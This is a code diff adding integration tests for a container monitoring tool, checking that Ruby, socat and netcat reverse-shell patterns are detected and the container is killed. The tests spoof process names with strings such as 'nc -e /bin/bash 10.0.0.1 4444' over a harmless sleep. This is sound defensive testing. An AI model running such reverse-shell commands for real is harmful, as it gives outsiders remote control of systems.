@@ -1337,6 +1337,166 @@ class TestReverseShellPatterns:
         proc.terminate()
         cleanup_container(container_name, coi_binary)
 
+    def test_ruby_reverse_shell_detection(self, test_workspace, enable_monitoring, coi_binary):
+        """Test Ruby reverse shell pattern detection."""
+        proc = subprocess.Popen(
+            [
+                coi_binary,
+                "shell",
+                "--workspace",
+                test_workspace,
+                "--slot",
+                "30",
+                "--monitor",
+            ],
+            stdin=subprocess.DEVNULL,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        time.sleep(8)
+
+        container_name = get_container_name_from_workspace(test_workspace).replace("-1", "-30")
+
+        if get_container_state(container_name) == "Unknown":
+            proc.terminate()
+            pytest.skip(f"Container {container_name} not found")
+
+        # Wait for monitoring baseline to stabilize
+        time.sleep(10)
+
+        # Inject Ruby reverse shell pattern (uses -rsocket flag for socket library)
+        subprocess.Popen(
+            [
+                "incus",
+                "exec",
+                container_name,
+                "--",
+                "bash",
+                "-c",
+                "exec -a 'ruby -rsocket -e socket' sleep 30",
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        time.sleep(5)
+
+        killed = False
+        for _ in range(15):
+            time.sleep(1)
+            state = get_container_state(container_name)
+            if state in ["Stopped", "Frozen", "Unknown"]:
+                killed = True
+                break
+
+        if not killed:
+            events = get_threat_events(container_name)
+            print("\n=== DEBUG: Ruby test - container not killed ===")
+            print(f"Final state: {get_container_state(container_name)}")
+            print(f"Total threat events: {len(events)}")
+            for event in events:
+                print(
+                    f"- level={event.get('level')}, category={event.get('category')}, "
+                    f"title={event.get('title')}, desc={event.get('description')[:100] if event.get('description') else 'N/A'}"
+                )
+            print("=== END DEBUG ===\n")
+
+        assert killed, "Container should be killed on Ruby reverse shell detection"
+
+        events = get_threat_events(container_name)
+        critical = [e for e in events if e.get("level") == "critical"]
+
+        if len(critical) == 0:
+            print("\n=== DEBUG: No CRITICAL events found ===")
+            print(f"All events: {events}")
+            print("=== END DEBUG ===\n")
+
+        assert len(critical) > 0, "Expected CRITICAL threat for Ruby reverse shell"
+
+        proc.terminate()
+        cleanup_container(container_name, coi_binary)
+
+    def test_socat_reverse_shell_detection(self, test_workspace, enable_monitoring, coi_binary):
+        """Test socat reverse shell pattern detection."""
+        proc = subprocess.Popen(
+            [
+                coi_binary,
+                "shell",
+                "--workspace",
+                test_workspace,
+                "--slot",
+                "31",
+                "--monitor",
+            ],
+            stdin=subprocess.DEVNULL,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        time.sleep(8)
+
+        container_name = get_container_name_from_workspace(test_workspace).replace("-1", "-31")
+
+        if get_container_state(container_name) == "Unknown":
+            proc.terminate()
+            pytest.skip(f"Container {container_name} not found")
+
+        # Wait for monitoring baseline to stabilize
+        time.sleep(10)
+
+        # Inject socat reverse shell pattern (EXEC: variant used in shells)
+        subprocess.Popen(
+            [
+                "incus",
+                "exec",
+                container_name,
+                "--",
+                "bash",
+                "-c",
+                "exec -a 'socat EXEC:bash' sleep 30",
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        time.sleep(5)
+
+        killed = False
+        for _ in range(15):
+            time.sleep(1)
+            state = get_container_state(container_name)
+            if state in ["Stopped", "Frozen", "Unknown"]:
+                killed = True
+                break
+
+        if not killed:
+            events = get_threat_events(container_name)
+            print("\n=== DEBUG: socat test - container not killed ===")
+            print(f"Final state: {get_container_state(container_name)}")
+            print(f"Total threat events: {len(events)}")
+            for event in events:
+                print(
+                    f"- level={event.get('level')}, category={event.get('category')}, "
+                    f"title={event.get('title')}, desc={event.get('description')[:100] if event.get('description') else 'N/A'}"
+                )
+            print("=== END DEBUG ===\n")
+
+        assert killed, "Container should be killed on socat reverse shell detection"
+
+        events = get_threat_events(container_name)
+        critical = [e for e in events if e.get("level") == "critical"]
+
+        if len(critical) == 0:
+            print("\n=== DEBUG: No CRITICAL events found ===")
+            print(f"All events: {events}")
+            print("=== END DEBUG ===\n")
+
+        assert len(critical) > 0, "Expected CRITICAL threat for socat reverse shell"
+
+        proc.terminate()
+        cleanup_container(container_name, coi_binary)
+
 
 class TestMonitoringConfiguration:
     """Test monitoring configuration options."""
@@ -1497,6 +1657,105 @@ poll_interval_sec = 1
 
         finally:
             # Restore original config
+            if backup:
+                config_path.write_text(backup)
+            elif config_path.exists():
+                config_path.unlink()
+
+    def test_monitor_flag_overrides_config_auto_kill_disabled(self, test_workspace, coi_binary):
+        """Test that --monitor flag forces auto_kill_on_critical=true even when config disables it."""
+        config_path = Path.home() / ".config" / "coi" / "config.toml"
+        backup = config_path.read_text() if config_path.exists() else None
+
+        config_path.parent.mkdir(parents=True, exist_ok=True)
+        config_path.write_text(
+            """
+[monitoring]
+enabled = true
+auto_kill_on_critical = false
+poll_interval_sec = 1
+"""
+        )
+
+        try:
+            # Start shell WITH --monitor flag: should force auto_kill regardless of config
+            proc = subprocess.Popen(
+                [
+                    coi_binary,
+                    "shell",
+                    "--workspace",
+                    test_workspace,
+                    "--slot",
+                    "32",
+                    "--monitor",
+                ],
+                stdin=subprocess.DEVNULL,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+            )
+
+            time.sleep(8)
+
+            container_name = get_container_name_from_workspace(test_workspace).replace("-1", "-32")
+
+            if get_container_state(container_name) == "Unknown":
+                proc.terminate()
+                pytest.skip(f"Container {container_name} not found")
+
+            # Wait for monitoring baseline to stabilize
+            time.sleep(10)
+
+            # Inject critical reverse shell pattern
+            subprocess.Popen(
+                [
+                    "incus",
+                    "exec",
+                    container_name,
+                    "--",
+                    "bash",
+                    "-c",
+                    "exec -a 'nc -e /bin/bash 10.0.0.1 4444' sleep 30",
+                ],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+            )
+
+            time.sleep(5)
+
+            # Container SHOULD be killed: --monitor flag forces auto_kill_on_critical=true
+            killed = False
+            for _ in range(15):
+                time.sleep(1)
+                state = get_container_state(container_name)
+                if state in ["Stopped", "Frozen", "Unknown"]:
+                    killed = True
+                    break
+
+            if not killed:
+                events = get_threat_events(container_name)
+                print("\n=== DEBUG: --monitor override test - container not killed ===")
+                print(f"Final state: {get_container_state(container_name)}")
+                print(f"Total threat events: {len(events)}")
+                for event in events:
+                    print(
+                        f"- level={event.get('level')}, category={event.get('category')}, "
+                        f"title={event.get('title')}"
+                    )
+                print("=== END DEBUG ===\n")
+
+            assert killed, (
+                "--monitor flag should force auto_kill_on_critical=true "
+                "even when config has auto_kill_on_critical=false"
+            )
+
+            events = get_threat_events(container_name)
+            critical = [e for e in events if e.get("level") == "critical"]
+            assert len(critical) > 0, "Expected CRITICAL threat logged"
+
+            proc.terminate()
+            cleanup_container(container_name, coi_binary)
+
+        finally:
             if backup:
                 config_path.write_text(backup)
             elif config_path.exists():
